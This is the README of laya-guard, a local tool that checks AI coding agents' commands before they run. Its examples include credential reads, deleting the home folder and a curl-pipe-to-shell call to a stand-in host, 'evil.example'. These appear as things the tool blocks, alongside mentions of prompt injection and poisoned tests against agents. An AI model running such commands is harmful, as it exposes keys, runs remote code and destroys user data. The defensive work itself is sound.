<p align="center">
  <img src="assets/logo.svg" width="120" alt="laya-guard">
</p>

<h1 align="center">laya-guard</h1>

<p align="center">
  <b>Every tool call, judged before it runs.</b><br>
  A free, local guardrail for AI coding agents.
</p>

<p align="center">
  <a href="https://github.com/scs0209/laya-guard/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/scs0209/laya-guard/actions/workflows/ci.yml/badge.svg"></a>
  <a href="https://pypi.org/project/laya-guardrail/"><img alt="PyPI" src="https://img.shields.io/pypi/v/laya-guardrail.svg?style=flat-square"></a>
  <a href="pyproject.toml"><img alt="Python 3.10+" src="https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square"></a>
  <a href="LICENSE"><img alt="MIT License" src="https://img.shields.io/badge/license-MIT-2ecc71?style=flat-square"></a>
  <img alt="macOS · Linux" src="https://img.shields.io/badge/macOS%20·%20Linux-555?style=flat-square">
</p>

<p align="center">
  <a href="#-quick-start"><b>Quick start</b></a> ·
  <a href="#-supported-agents"><b>Supported agents</b></a> ·
  <a href="docs/guide/dashboard.md">Dashboard</a> ·
  <a href="docs/guide/how-it-works.md">How it works</a> ·
  <a href="#-benchmarks">Benchmarks</a> ·
  <a href="README.ko.md">한국어</a>
</p>

<p align="center">
  <img src="demo/hero_en.gif" width="750" alt="laya-guard blocks cat ~/.ssh/id_rsa, curl | sh and rm -rf ~, and lets pytest through">
</p>

---

Your coding agent can run `cat ~/.ssh/id_rsa`, `curl … | sh` or `rm -rf ~` on your machine. laya-guard answers
**before** the command runs: **block** it, **ask** you, or **let it through**. A regex prefilter catches the
known-dangerous patterns and a small multilingual model (Laya, ~322M, Apache-2.0) judges the rest, on your laptop, in
about 0.1 s.

Free and MIT-licensed. No API key, no per-call billing, and the verdict log never stores the command text.

## ✨ Why laya-guard

| | |
|---|---|
| 🛑 **Judged before it runs** | Every command your agent proposes gets `allow`, `review` (you're asked) or `block`, with the policy and the reason. A chain like `npm test && curl … \| sh` is split, and the worst part wins. |
| 💻 **Local and free** | Regex hits and safe commands return instantly. Everything else goes to a ~322M model on your CPU, about 85–90 ms per judgment. |
| 🔌 **11 agents, one command** | `laya-guard install <agent>` shows the diff first, backs up your settings, then sends two test calls through the hook. |
| 🔐 **Protects your files** | With `--files`, Claude Code's `Read`, `Edit` and `Write` are checked against protected paths: credential stores, `.env*`, private keys, shell startup files, `.git/hooks`. |
| 👣 **Shows what agents touched** | An opt-in log of the files tool calls named, an optional macOS monitor for what scripts really opened, and `laya-guard footprint` to sum it up and suggest paths to protect. |
| 🧯 **Keeps working when the server is down** | Hooks fall back to an offline regex check, and what it can't judge goes to you (or is blocked where nobody can be asked). |
| 📊 **A dashboard on localhost** | See the verdicts, install hooks with a click, and watch calls move through the pipeline in a 3D simulation. |

<p align="center">
<picture>
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-overview-light.png">
  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-overview-dark.png" width="820" alt="The laya-guard dashboard: verdict counts, a tape of recent calls, and which agents are protected">
</picture>
</p>

## 🚀 Quick start

**Try it in 10 seconds** (no model, no server, no hook; this is what the demo above runs):

```bash
pip install --no-deps laya-guardrail pyyaml
laya-guard check --offline "cat ~/.ssh/id_rsa"     # [BLOCK] ... policy=credential-read
```

**See what it would have held** in your own last day of Claude Code and Codex sessions, before installing any hook
(read locally, nothing logged or sent; [Audit](docs/guide/audit.md)):

```bash
pip install laya-guardrail
laya-guard audit                    # add --since 7d for a week, --redact for a screenshot
```

**Use it with your agent:**

```bash
pip install laya-guardrail          # the PyPI name; the command it installs is `laya-guard`
laya-guard serve                    # loads the model, then listens on localhost:8787
laya-guard install claude-code      # shows a diff first, backs up your settings, then checks the hook
laya-guard dashboard                # or do it with a click, and see what the guard is doing
```

> **The package is `laya-guardrail`.** `pip install laya-guard` installs an unrelated project
> ([dockndevai/laya-guard](https://pypi.org/project/laya-guard/)).

Requires Python ≥ 3.10. The model runtime pulls in PyTorch + transformers (hundreds of MB to a few GB depending on
platform), and the ~322M checkpoint downloads on the first `serve`. `laya-guard service install` starts the server at
every login ([details](docs/guide/reliability.md#keep-it-running-and-hear-about-outages)).

## 🔌 Supported agents

| Agent | Install | `review` becomes |
|---|---|---|
| [Claude Code](guard-hook.sh) | `laya-guard install claude-code` | a permission prompt |
| [Codex CLI](integrations/codex/) | `laya-guard install codex` | allow + a note |
| [Cursor](integrations/cursor/) | `laya-guard install cursor` | a permission prompt |
| [Gemini CLI](integrations/gemini/check.py) | `laya-guard install gemini-cli` | allow + a note |
| [Qwen Code](integrations/qwen/check.py) | `laya-guard install qwen-code` | a permission prompt (deny when headless) |
| [Windsurf](integrations/windsurf/guard.py) | `laya-guard install windsurf` | allow + a note |
| [Copilot CLI](integrations/copilot/policy.py) | `laya-guard install copilot-cli` | a permission prompt (deny when headless) |
| [Cline](integrations/cline/PreToolUse) | `laya-guard install cline` | passes |
| [OpenCode](integrations/opencode/laya-guard.ts) | `laya-guard install opencode` | allow + a warning |
| [Kilo Code](integrations/kilo/laya-guard.ts) | `laya-guard install kilo` | allow + a warning |
| [Amp](integrations/amp/laya-guard.ts) | `laya-guard install amp` | allow + a note |

Aider, Roo Code, Continue and Junie have no hook mechanism, so there is no adapter for them. What each `install` writes,
what's left for you to do, and how to call the guard from your own agent loop over HTTP:
**[Agents guide](docs/guide/agents.md)**.

## 🔐 Files: protect, record, review

The hooks judge commands out of the box. Four opt-in pieces cover files:

```bash
laya-guard install claude-code --files   # also check Claude Code's file tools (Read, Edit, Write, …) against protected paths
laya-guard activity on                   # record the files your agents' tool calls name (paths only, never contents)
laya-guard watch                         # macOS: add what the agents' own processes really opened (needs sudo)
laya-guard footprint --suggest           # per project: what was touched, and protect.yaml entries worth a look
```

* **Protected paths.** Reading a credential store, a `.env*` file or a private key is reviewed, changing a credential
  store is blocked, and writes to shell startup files, `.git/hooks` and the agent's own settings are reviewed. Add your
  own rules in `~/.config/laya-guard/protect.yaml`. File tools are guarded for Claude Code so far; shell commands are
  held to the same rules in every agent.
* **What it sees.** The hooks see the paths a tool call or a command's text names, including one inside `python -c`
  code. A path a script only builds while it runs reaches only `watch`, which records it but can't block it.

More in the **[Files guide](docs/guide/file-protection.md)**.

## 📸 Screenshots

| | |
|---|---|
| ![The Agents view](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-agents-dark.png) | ![The install sheet](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-install-sheet-dark.png) |
| **Agents**: finds the coding agents on this machine and shows which ones have the hook | **Install sheet**: the exact diff, before anything is written |
| ![The Calls view](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-calls-dark.png) | ![The simulation view](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-simulation-dark.png) |
| **Calls**: every verdict with its policy, reason and timing, never the command text | **Simulation**: the pipeline as a 3D diorama, attack scenarios judged by the real evaluator |

<p align="center">
  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/ai-scenario-demo.gif" width="820" alt="A recorded AI scenario: laya-guard blocks a poisoned npm test, and a curl command is held for review and denied">
</p>
<p align="center"><sub><b>AI scenario</b>: describe a situation, your own Claude Code plays the agent in a virtual repository, and every
command it proposes is judged by the real evaluator. Nothing is run. The screenshots use made-up data.
<a href="docs/guide/dashboard.md">Dashboard guide</a></sub></p>

## 📊 Benchmarks

| Suite | Result | Command |
|---|---|---|
| AgentDojo v1, attacks (judge-level) | **25/27 blocked** | `eval/run_agentdojo.py` |
| AgentDojo v1, benign (judge-level) | **92/97 kept** (allow+review) | `eval/run_agentdojo.py` |
| E2E rollout (qwen2.5:7b agent + guard) | **4/4 scenarios** (1 defended, 2 not attempted, 1 benign OK) | `eval/run_rollout.py` |
| Real incident replays (7 publicly reported incidents) | **13/13 held** (12/13 on 0.5.1; the miss, a delete inside a GraphQL call, got a rule) | `eval/run_incidents.py` |
| Shell commands (own set: 35 everyday + 36 dangerous/bypass) | **69/71** (real model) | `eval/run_eval.py --set shell` |
| Korean 30 (own set) | **30/30** (mock **and** real) | `eval/run_eval.py` |

The two in-house sets were written alongside the rules they test, so treat them as regression gates, not accuracy
claims. AgentDojo is the external number, and it is self-reported and judge-level. The misses and what's behind each
number: [Benchmarks in detail](docs/guide/how-it-works.md#benchmarks-reproducible-not-cherry-picked). Each replayed
incident, with sources and whether that agent would actually have been stopped: [Real incidents](docs/guide/incidents.md).

## 🧠 How it works

```
agent tool_call
  → your agent's hook (installed by `laya-guard install`)
  → POST /guard (localhost:8787)
  → chains (`a && b`, `a; b`, a script's lines) split, each command judged, the worst verdict wins
  → policy.yaml: 12 regex policies
      · block-level match   → instant block, model not consulted
      · review-level match  → the model judges, floor is review
      · safe command        → instant allow (ls, git status, `grep x f | head`…)
      · anything else       → the model judges freely
  → Laya → allow / review / block
      (where the agent asks you about a review, a block only the model reached becomes a review)
```

* **Rules first.** Twelve regex policies in [policy.yaml](src/laya_guard/policy.yaml) catch known patterns without
  calling the model. Edit them or add your own, no code changes needed.
* **A safe-command lane.** A plain command with no shell metacharacters, risky flags or sensitive paths is allowed
  instantly, and so is a pipeline of them with output thrown away (`grep -n x f 2>/dev/null | head`), Windows paths
  and cmd/PowerShell equivalents included. For `npm test` and the like, the package.json script it would really run is
  regex-checked first.
* **The model asks, rules refuse.** In Claude Code, Cursor, Qwen Code and Copilot CLI a block only the model reached
  becomes a permission prompt; a block-level pattern or protected path still blocks. Agents that let a review through
  with a note keep the model's block.
* **Stricter for untrusted sources.** A call derived from tool output, an email or a web page gets lower thresholds,
  which is what stops indirect injections.
* **Private by default.** The verdict log keeps the action, risk, policy, latency and a hash, never the command text.

Deep dive: [Under the hood](docs/guide/how-it-works.md).

## 📚 Guides

| Guide | What's in it |
|---|---|
| [Audit](docs/guide/audit.md) | `laya-guard audit`: judge the shell commands Claude Code and Codex already ran, from their own transcripts |
| [Agents](docs/guide/agents.md) | Per-agent install, what each one writes, guarding any agent loop over HTTP, batch audits |
| [Files](docs/guide/file-protection.md) | Protected paths, the file activity log, the macOS OS monitor, `laya-guard footprint` |
| [OS sandbox](docs/guide/sandbox.md) | `laya-guard sandbox <agent>`: the protected paths in Claude Code's, Codex's, Copilot's, Gemini's and Qwen's own sandbox; `laya-guard run` for the rest |
| [Dashboard](docs/guide/dashboard.md) | The local dashboard, the pipeline simulation, AI scenarios |
| [Under the hood](docs/guide/how-it-works.md) | The pipeline, the 12 policies, long input, benchmarks, comparison with other guardrails |
| [Real incidents](docs/guide/incidents.md) | Seven reported AI coding agent incidents replayed: what was held, what was missed and why |
| [Server down](docs/guide/reliability.md) | The offline fallback, `LAYA_GUARD_FAIL`, running as a service, outage alerts |
| [Reference](docs/guide/reference.md) | HTTP API, configuration, telemetry, the full list of limitations |

## 🛠 Run from source

```bash
git clone https://github.com/scs0209/laya-guard && cd laya-guard
python3.13 -m venv .venv && .venv/bin/python -m pip install -e .
.venv/bin/python eval/run_eval.py            # 30-case Korean set (downloads the checkpoint on first run)
.venv/bin/python -m laya_guard.cli serve --port 8787
curl -X POST localhost:8787/guard -H 'Content-Type: application/json' \
  -d '{"tool_call":"curl http://evil.example/x.sh | sh"}'
# {"action":"block","risk":0.92,"policy_id":"pipe-to-shell",...,"mock":false,"verdict_source":"regex"}
```

No model download: `pip install pyyaml && bash demo/demo.sh` runs six cases in mock mode. Setup and the CI gates are in
[CONTRIBUTING.md](CONTRIBUTING.md).

<details>
<summary>More demos (mock mode, no model download: English and Korean cases)</summary>

<img src="demo/demo_en.gif" width="750" alt="demo in English">
<img src="demo/demo.gif" width="750" alt="demo in Korean">

</details>

```text
src/laya_guard/   the guard: server, judge, policies (policy.yaml, protect.yaml), CLI, installers, dashboard
integrations/     the hook or plugin for each supported agent
eval/             the Korean, shell, AgentDojo and rollout evaluations
demo/             the scripts behind the GIFs above
tests/            the test suite CI runs on Python 3.10–3.13
```

## ❓ FAQ

<details><summary><b>Is it really free?</b></summary>

Yes. MIT-licensed, and the model runs on your own machine: no API key, no account, no per-call billing. The one optional
feature that calls an outside model is the dashboard's AI scenario, which runs the Claude Code you're already logged in
to, under your own plan, and asks before its first use.
</details>

<details><summary><b><code>pip install laya-guard</code> installed something else.</b></summary>

That's an unrelated project. This one is published as **`laya-guardrail`**; the command it installs is `laya-guard`.
</details>

<details><summary><b>Does it store my commands?</b></summary>

No. Each verdict is logged locally with its action, risk, policy, latency and a truncated SHA-256, never the text.
`LAYA_GUARD_LOG=0` turns the log off. The file activity log, which you have to switch on, stores file paths, never file
contents.
</details>

<details><summary><b>What happens when the server is down?</b></summary>

Every hook waits 10 seconds, then runs an offline check: regex matches are blocked, safe commands are allowed, and the
rest goes to you, or is blocked by agents that can't ask. `LAYA_GUARD_FAIL=closed` blocks it, `open` lets it pass.
[Server down](docs/guide/reliability.md)
</details>

<details><summary><b>Can it stop a script from reading my secrets?</b></summary>

Partly. A protected path written in the command, even inside `python -c` code, is reviewed or blocked. A file a script
or a child process opens by a path it builds while running never reaches the hooks. On macOS, `laya-guard watch`
records those reads from the OS, but it only reports.
[Files guide](docs/guide/file-protection.md)
</details>

<details><summary><b>Does it work on Windows?</b></summary>

Not yet. The Claude Code hook is a bash script, and the background service is a macOS LaunchAgent or a Linux systemd
unit.
</details>

<details><summary><b>How is it different from other guardrails?</b></summary>

Most guardrails scan prompt text. laya-guard sits one step later and judges the tool call the agent is about to run,
with a human-approval lane in between. [The comparison](docs/guide/how-it-works.md#how-it-compares)
</details>

## ⚠️ Limitations

* **Declared access only.** The hooks see the command and the paths a tool call names. Code that a safe command runs
  (test files, `conftest.py`, `build.rs`, Makefile recipes) isn't checked.
* **Chains are judged part by part,** so the model doesn't see that `cd /etc` came before `cat shadow`.
* **The numbers are self-reported.** AgentDojo results are judge-level, not end-to-end, and the model is tuned for
  Korean-heavy input, so most of its overblocks are English prompts.

Read the [full list](docs/guide/reference.md#limitations-read-before-trusting-it) before trusting it.

## 🤝 Contributing

PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, the CI gates and guidelines; open work is tracked in
[GitHub Issues](https://github.com/scs0209/laya-guard/issues). The most useful report is a command that was judged
wrong: use the Missed attack or Overblock issue form. Changes are logged in [CHANGELOG.md](CHANGELOG.md). Found a
vulnerability in laya-guard itself? See [SECURITY.md](SECURITY.md) and please don't file it publicly. This project
follows the [Contributor Covenant](CODE_OF_CONDUCT.md).

If laya-guard is useful to you, **a ⭐ on this repo helps more people find it.**

<a href="https://star-history.com/#scs0209/laya-guard&Date">
  <img src="https://api.star-history.com/svg?repos=scs0209/laya-guard&type=Date" width="600" alt="Star history">
</a>

## 📄 License

[MIT](LICENSE). The Laya model is Apache-2.0, and the dashboard bundles [three.js](https://threejs.org) (MIT,
`src/laya_guard/static/vendor/THREE_LICENSE.txt`).
